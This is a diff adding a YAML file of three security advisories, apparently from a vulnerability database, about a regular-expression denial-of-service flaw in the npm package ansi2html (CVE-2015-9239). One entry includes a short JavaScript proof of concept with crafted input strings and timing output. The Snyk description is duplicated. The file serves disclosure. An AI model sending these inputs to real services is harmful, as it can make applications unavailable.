@@ -1,0 +1,98 @@
+---
+- id: nodesecurity:npm:ansi2html:2015-10-25
+  title: Regular Expression Denial of Service
+  description: |-
+    The `ansi2html` package is affected by a regular expression denial of service vulnerability when certain types of user input is passed in.
+
+
+    ## Proof of concept
+    ```
+    var ansi2html = require('ansi2html')
+
+    var start = process.hrtime();
+    ansi2html("[1111111111111111111111;0000000000000000000000");
+    console.log(process.hrtime(start));
+
+    start = process.hrtime();
+    ansi2html("[1111111111111111111111;00000000000000000000000");
+    console.log(process.hrtime(start));
+
+    start = process.hrtime();
+    ansi2html("[1111111111111111111111;000000000000000000000000");
+    console.log(process.hrtime(start));
+
+    start = process.hrtime();
+    ansi2html("[1111111111111111111111;0000000000000000000000000000");
+    console.log(process.hrtime(start));
+    ```
+
+    Results of the above
+    ```
+    00:29:53-adam_baldwin~/tmp$ node test
+    [ 0, 119615367 ]
+    [ 0, 149934565 ]
+    [ 0, 233325677 ]
+    [ 3, 46582479 ]
+    ```
+  affected_package: ansi2html
+  vulnerable_versions:
+  - "<=99.999.99999"
+  patched_versions:
+  - "<0.0.0"
+  severity: high
+  package_manager: npm
+  cvss_v3_vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+  credit:
+  - Adam Baldwin
+  references:
+  - ''
+  source_url: https://nodesecurity.io/advisories/51
+- id: ossindex:npm:ansi2html:2017-01-25
+  title: Regular Expression Denial of Service
+  description: "> ansi2html is vulnerable to regular expression denial of service
+    (ReDoS) when certain types of user input is passed in.\n> \n> [nodesecurity.io](https://nodesecurity.io/advisories/51)"
+  affected_package: ansi2html
+  vulnerable_versions:
+  - ">=0"
+  package_manager: npm
+  credit:
+  - OSSIndex
+  references:
+  - https://nodesecurity.io/advisories/51
+  source_url: https://ossindex.net/resource/package/7012063544/vulnerabilities
+- id: snykio:npm:ansi2html:2015-10-25
+  title: Regular Expression Denial of Service (DoS)
+  description: |
+    `ansi2html` does not control the length of the input it processes, and
+    uses regular expressions to parse it. As a result, it is susceptible to
+    a [Regular expression Denial of Service (ReDoS)][1] vulnerabilities,
+    rendering an application unavailable if a long or complex input is
+    passed in.
+
+
+
+    [1]: https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
+    \n`ansi2html` does not control the length of the input it processes, and
+    uses regular expressions to parse it. As a result, it is susceptible to
+    a [Regular expression Denial of Service (ReDoS)][1] vulnerabilities,
+    rendering an application unavailable if a long or complex input is
+    passed in.
+
+
+
+    [1]: https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
+  affected_package: ansi2html
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2015-9239
+  cwe:
+  - CWE-400
+  credit:
+  - Adam Baldwin
+  references:
+  - https://github.com/agnoster/ansi2html/blob/master/lib/index.js#L52
+  - https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
+  source_url: https://snyk.io/vuln/npm:ansi2html:20151025
